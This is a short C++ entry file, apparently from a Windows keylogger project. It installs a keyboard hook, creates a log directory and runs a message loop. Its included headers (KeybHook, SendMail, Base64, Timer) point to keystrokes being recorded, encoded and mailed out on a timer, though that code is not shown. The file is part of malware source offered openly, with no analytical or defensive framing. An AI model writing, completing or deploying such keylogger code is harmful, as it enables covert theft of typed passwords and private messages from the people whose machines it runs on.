#include <iostream>
#include "../Headers/KCsts.h"
#include "../Headers/Helper.h"
#include "../Headers/Base64.h"
#include "../Headers/IO.h"
#include "../Headers/KeybHook.h"
#include "../Headers/Timer.h"
#include "../Headers/SendMail.h"

using namespace std;



int main(){

    MSG Msg;
    bool d= IO:: MKDir(IO::getPath(true));
    KeybHook::InstallHook();

    while(GetMessage(&Msg,NULL,0,0))
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }

    MailTimer.stop();
    return 0;

}